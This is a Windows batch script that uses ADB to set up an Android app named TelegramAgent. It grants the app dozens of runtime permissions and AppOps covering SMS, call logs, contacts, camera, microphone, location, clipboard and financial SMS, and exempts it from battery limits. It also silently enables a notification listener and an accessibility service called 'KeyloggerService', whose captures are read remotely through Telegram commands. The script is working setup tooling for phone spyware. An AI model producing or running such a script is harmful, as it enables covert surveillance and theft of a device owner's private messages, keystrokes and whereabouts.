@echo off
setlocal EnableDelayedExpansion
set PKG=com.thunderx.telegramagent
set LISTENER=%PKG%/com.thunderx.telegramagent.NotificationListener
set ACCESSIBILITY=%PKG%/com.thunderx.telegramagent.KeyloggerService

title TelegramAgent - Full Permission Grant

echo ============================================
echo   TelegramAgent - FULL Permission Setup
echo   Package: %PKG%
echo ============================================
echo.

REM ============================================================
REM   [0] Check ADB device
REM ============================================================
echo [0/7] Checking ADB device...
adb get-state 1>nul 2>&1
if errorlevel 1 (
    echo   [ERROR] No ADB device connected.
    echo   - Connect USB cable
    echo   - Enable USB Debugging
    echo   - Accept RSA prompt on device
    pause
    exit /b 1
)
echo   OK - device connected.

REM ============================================================
REM   [1] Check package installed
REM ============================================================
echo.
echo [1/7] Checking package installed...
adb shell pm list packages 2>nul | findstr /C:"%PKG%" >nul
if errorlevel 1 (
    echo   [ERROR] %PKG% is NOT installed.
    echo   Install first: adb install app-debug.apk
    pause
    exit /b 1
)
echo   OK - package found.

REM ============================================================
REM   [2] Runtime permissions (pm grant)
REM ============================================================
echo.
echo [2/7] Granting runtime permissions...
set GOK=0
set GFAIL=0
for %%P in (
  android.permission.READ_CONTACTS
  android.permission.WRITE_CONTACTS
  android.permission.READ_CALL_LOG
  android.permission.WRITE_CALL_LOG
  android.permission.CALL_PHONE
  android.permission.READ_PHONE_STATE
  android.permission.READ_PHONE_NUMBERS
  android.permission.ANSWER_PHONE_CALLS
  android.permission.PROCESS_OUTGOING_CALLS
  android.permission.READ_SMS
  android.permission.SEND_SMS
  android.permission.RECEIVE_SMS
  android.permission.RECEIVE_MMS
  android.permission.RECEIVE_WAP_PUSH
  android.permission.READ_CALENDAR
  android.permission.WRITE_CALENDAR
  android.permission.CAMERA
  android.permission.RECORD_AUDIO
  android.permission.MODIFY_AUDIO_SETTINGS
  android.permission.BODY_SENSORS
  android.permission.BODY_SENSORS_BACKGROUND
  android.permission.ACTIVITY_RECOGNITION
  android.permission.ACCESS_FINE_LOCATION
  android.permission.ACCESS_COARSE_LOCATION
  android.permission.ACCESS_BACKGROUND_LOCATION
  android.permission.ACCESS_MEDIA_LOCATION
  android.permission.READ_EXTERNAL_STORAGE
  android.permission.WRITE_EXTERNAL_STORAGE
  android.permission.MANAGE_EXTERNAL_STORAGE
  android.permission.READ_MEDIA_IMAGES
  android.permission.READ_MEDIA_VIDEO
  android.permission.READ_MEDIA_AUDIO
  android.permission.READ_MEDIA_VISUAL_USER_SELECTED
  android.permission.POST_NOTIFICATIONS
  android.permission.BLUETOOTH_CONNECT
  android.permission.BLUETOOTH_SCAN
  android.permission.BLUETOOTH_ADVERTISE
  android.permission.NEARBY_WIFI_DEVICES
  android.permission.SCHEDULE_EXACT_ALARM
  android.permission.USE_EXACT_ALARM
  android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
  android.permission.GET_ACCOUNTS
  android.permission.SYSTEM_ALERT_WINDOW
  android.permission.WRITE_SETTINGS
  android.permission.VIBRATE
  android.permission.WAKE_LOCK
  android.permission.FOREGROUND_SERVICE
  android.permission.FOREGROUND_SERVICE_DATA_SYNC
  android.permission.FOREGROUND_SERVICE_CAMERA
  android.permission.FOREGROUND_SERVICE_MICROPHONE
  android.permission.FOREGROUND_SERVICE_LOCATION
  android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION
  android.permission.RECEIVE_BOOT_COMPLETED
  android.permission.QUERY_ALL_PACKAGES
  android.permission.REQUEST_INSTALL_PACKAGES
  android.permission.REQUEST_DELETE_PACKAGES
  android.permission.READ_LOGS
  android.permission.DUMP
  android.permission.PACKAGE_USAGE_STATS
) do (
  adb shell pm grant %PKG% %%P >nul 2>&1
  if !errorlevel! equ 0 (
    set /a GOK+=1
  ) else (
    set /a GFAIL+=1
  )
)
echo   Granted: !GOK!  ^| Skipped: !GFAIL!

REM ============================================================
REM   [3] AppOps (system-level overrides)
REM ============================================================
echo.
echo [3/7] Setting AppOps...
set OOK=0
set OFAIL=0
for %%O in (
  PROJECT_MEDIA
  READ_CLIPBOARD
  WRITE_CLIPBOARD
  LEGACY_STORAGE
  MANAGE_EXTERNAL_STORAGE
  READ_EXTERNAL_STORAGE
  WRITE_EXTERNAL_STORAGE
  READ_MEDIA_IMAGES
  READ_MEDIA_VIDEO
  READ_MEDIA_AUDIO
  READ_MEDIA_VISUAL_USER_SELECTED
  CAMERA
  RECORD_AUDIO
  FINE_LOCATION
  COARSE_LOCATION
  MONITOR_LOCATION
  MONITOR_HIGH_POWER_LOCATION
  READ_CONTACTS
  WRITE_CONTACTS
  READ_CALL_LOG
  WRITE_CALL_LOG
  CALL_PHONE
  PROCESS_OUTGOING_CALLS
  READ_SMS
  SEND_SMS
  RECEIVE_SMS
  RECEIVE_MMS
  READ_CALENDAR
  WRITE_CALENDAR
  BODY_SENSORS
  ACTIVITY_RECOGNITION
  READ_PHONE_STATE
  READ_PHONE_NUMBERS
  ANSWER_PHONE_CALLS
  SYSTEM_ALERT_WINDOW
  REQUEST_INSTALL_PACKAGES
  GET_USAGE_STATS
  PACKAGE_USAGE_STATS
  WRITE_SETTINGS
  VIBRATE
  WAKE_LOCK
  START_FOREGROUND
  RUN_IN_BACKGROUND
  RUN_ANY_IN_BACKGROUND
  TOAST_WINDOW
  BOOT_COMPLETED
  READ_DEVICE_IDENTIFIERS
  USE_FULL_SCREEN_INTENT
  TURN_SCREEN_ON
  POST_NOTIFICATION
  ACCESS_NOTIFICATION_POLICY
  GET_ACCOUNTS
  USE_BIOMETRIC
  USE_FINGERPRINT
  QUERY_ALL_PACKAGES
  SCHEDULE_EXACT_ALARM
  INSTANT_APP_START_FOREGROUND
  ESTABLISH_VPN_SERVICE
  ESTABLISH_VPN_MANAGER
  ACCESS_RESTRICTED_SETTINGS
  ACTIVATE_VPN
  BAL
  CHANGE_APP_IDLE_STATE
  CHANGE_DEVICE_IDLE_TEMP_WHITELIST
  GET_APP_OPS_STATS
  INTERACT_ACROSS_PROFILES
  MANAGE_IPSEC_TUNNELS
  MANAGE_MEDIA
  NO_ISOLATED_STORAGE
  READ_CELL_BROADCASTS
  READ_ICC_SMS
  WRITE_ICC_SMS
  WRITE_MEDIA_AUDIO
  WRITE_MEDIA_IMAGES
  WRITE_MEDIA_VIDEO
  WRITE_SMS
  TAKE_AUDIO_FOCUS
  AUDIO_MEDIA_VOLUME
  BLUETOOTH_CHANGE
  WIFI_CHANGE
  NFC_CHANGE
  ACCESS_ACCESSIBILITY
  BIND_ACCESSIBILITY_SERVICE
  READ_NOTIFICATION
  WRITE_NOTIFICATION
  SMS_FINANCIAL_TRANSACTIONS
) do (
  adb shell appops set %PKG% %%O allow >nul 2>&1
  if !errorlevel! equ 0 (
    set /a OOK+=1
  ) else (
    set /a OFAIL+=1
  )
)
echo   Set: !OOK!  ^| Skipped: !OFAIL!

REM ============================================================
REM   [4] Battery optimization whitelist
REM ============================================================
echo.
echo [4/7] Battery optimization whitelist...
adb shell dumpsys deviceidle whitelist +%PKG% >nul 2>&1
if errorlevel 1 (
    echo   [WARN] Could not whitelist via dumpsys.
) else (
    echo   OK - whitelisted.
)

REM Alternative method
adb shell cmd deviceidle whitelist +%PKG% >nul 2>&1
adb shell cmd appops set %PKG% RUN_IN_BACKGROUND allow >nul 2>&1
adb shell cmd appops set %PKG% RUN_ANY_IN_BACKGROUND allow >nul 2>&1
echo   OK - background execution allowed.

REM ============================================================
REM   [5] Enable Notification Listener (FIXED - full path + append)
REM ============================================================
echo.
echo [5/7] Enabling Notification Listener...

REM Try modern cmd (append, does not overwrite)
adb shell cmd notification allow_listener %LISTENER% >nul 2>&1
if !errorlevel! equ 0 (
    echo   OK - Notification Listener enabled via cmd.
    goto :check_listener
)

REM Fallback: read existing + append with colon separator
echo   Trying legacy settings method...
set EXISTING_LISTENERS=
for /f "delims=" %%L in ('adb shell settings get secure enabled_notification_listeners 2^>nul') do set EXISTING_LISTENERS=%%L
if "!EXISTING_LISTENERS!"=="null" set EXISTING_LISTENERS=
if "!EXISTING_LISTENERS!"=="" (
    set NEW_LISTENERS=%LISTENER%
) else (
    echo   Existing: !EXISTING_LISTENERS!
    echo   !EXISTING_LISTENERS! | findstr /C:"%LISTENER%" >nul
    if !errorlevel! equ 0 (
        echo   Already present, skipping append.
        set NEW_LISTENERS=!EXISTING_LISTENERS!
    ) else (
        set NEW_LISTENERS=!EXISTING_LISTENERS!:%LISTENER%
    )
)
adb shell settings put secure enabled_notification_listeners "!NEW_LISTENERS!" >nul 2>&1
echo   OK - Set via settings put.

:check_listener
for /f "delims=" %%L in ('adb shell settings get secure enabled_notification_listeners 2^>nul') do (
    echo   Current listeners: %%L
)

REM ============================================================
REM   [6] Enable Accessibility Service (FIXED - full path + append)
REM ============================================================
echo.
echo [6/7] Enabling Accessibility Service...

set EXISTING_ACC=
for /f "delims=" %%A in ('adb shell settings get secure enabled_accessibility_services 2^>nul') do set EXISTING_ACC=%%A
if "!EXISTING_ACC!"=="null" set EXISTING_ACC=
if "!EXISTING_ACC!"=="" (
    set NEW_ACC=%ACCESSIBILITY%
) else (
    echo   Existing: !EXISTING_ACC!
    echo   !EXISTING_ACC! | findstr /C:"%ACCESSIBILITY%" >nul
    if !errorlevel! equ 0 (
        echo   Already present, skipping append.
        set NEW_ACC=!EXISTING_ACC!
    ) else (
        set NEW_ACC=!EXISTING_ACC!:%ACCESSIBILITY%
    )
)
adb shell settings put secure enabled_accessibility_services "!NEW_ACC!" >nul 2>&1
adb shell settings put secure accessibility_enabled 1 >nul 2>&1
echo   OK - Accessibility Service enabled.

for /f "delims=" %%A in ('adb shell settings get secure enabled_accessibility_services 2^>nul') do (
    echo   Current accessibility services: %%A
)

REM ============================================================
REM   [7] Verification
REM ============================================================
echo.
echo [7/7] Verifying key permissions...
echo.

echo --- CALL / PHONE ---
adb shell appops get %PKG% 2>nul | findstr /I "CALL_LOG PHONE_STATE PHONE_NUMBERS CALL_PHONE"
echo.

echo --- SMS / CONTACTS ---
adb shell appops get %PKG% 2>nul | findstr /I "SMS CONTACTS"
echo.

echo --- STORAGE / MEDIA ---
adb shell appops get %PKG% 2>nul | findstr /I "STORAGE PROJECT_MEDIA"
echo.

echo --- CAMERA / MIC / LOCATION ---
adb shell appops get %PKG% 2>nul | findstr /I "CAMERA RECORD_AUDIO LOCATION"
echo.

echo --- NOTIFICATION / FOREGROUND ---
adb shell appops get %PKG% 2>nul | findstr /I "NOTIFICATION FOREGROUND"
echo.

echo --- NOTIFICATION LISTENER STATUS ---
adb shell settings get secure enabled_notification_listeners
echo.

echo --- ACCESSIBILITY STATUS ---
adb shell settings get secure enabled_accessibility_services
echo.

REM ============================================================
REM   Summary
REM ============================================================
echo ============================================
echo   DONE!
echo ============================================
echo.
echo   Runtime perms granted : !GOK!
echo   Runtime perms skipped : !GFAIL!
echo   AppOps set            : !OOK!
echo   AppOps skipped        : !OFAIL!
echo.
echo   MANUAL STEPS STILL NEEDED (if auto failed):
echo     1. Notification Access
echo        Settings - Apps - Special Access - Notification Access
echo     2. Accessibility Service
echo        Settings - Accessibility - Installed Services
echo     3. All Files Access
echo        Settings - Apps - Android-OS - Permissions - Files
echo     4. Background Location
echo        When prompted by app, choose "Allow all the time"
echo     5. Battery Optimization
echo        Settings - Apps - Android-OS - Battery - Unrestricted
echo.

REM ============================================================
REM   Force-stop app?
REM ============================================================
echo Force-stop %PKG%? (Y/N)
choice /C YN /N /T 10 /D Y
if errorlevel 2 goto :skip_stop
adb shell am force-stop %PKG%
echo   App force-stopped.

:skip_stop

REM ============================================================
REM   Start the app?
REM ============================================================
echo.
echo Start %PKG%? (Y/N)
choice /C YN /N /T 10 /D Y
if errorlevel 2 goto :skip_start
adb shell am start -n %PKG%/.MainActivity >nul 2>&1
echo   App started.

:skip_start

echo.
echo ============================================
echo   ALL DONE!
echo ============================================
echo.
echo   Test Notification Listener:
echo     1. Open any app that sends notifications
echo     2. Wait for a notification
echo     3. Send /notifications in Telegram
echo.
echo Press any key to exit.
pause >nul
endlocal
